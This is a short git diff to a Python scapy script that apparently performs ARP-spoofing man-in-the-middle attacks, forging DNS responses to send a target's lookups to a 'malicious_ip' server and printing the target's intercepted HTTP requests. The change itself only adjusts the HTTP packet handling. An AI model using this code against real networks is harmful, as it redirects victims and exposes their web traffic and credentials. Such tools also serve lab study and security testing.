@@ -1,5 +1,5 @@
 from scapy.all import * 
-from scapy.layers import http  
+from scapy.layers.http import HTTPRequest  
 import netifaces as ni
 import search_hosts as sh
 import arp_spoofing as arp
@@ -82,21 +82,12 @@ def process_udp_pkt(target, server, iface):
         if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
             resp_packet = build_dns_response_packet(pkt, server["ip"])
             sendp(resp_packet, iface=iface)
-        #elif pkt.haslayer(HTTP):
-            #http_header(pkt)
-        else:
+
+        elif pkt.haslayer(HTTPRequest):
             print(pkt.show())
+            
             #spoof.printf("Found another packet")
     return process_udp_pkt_inside
-
-#def http_header(packet):
-#        http_packet=str(packet)
-#        if http_packet.find('GET'):
-#                return GET_print(packet)
-
-#def GET_print(packet1):
-#    ret += "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
-#    return ret
 
 # Remake DNS packet
 def build_dns_response_packet(pkt, malicious_ip):
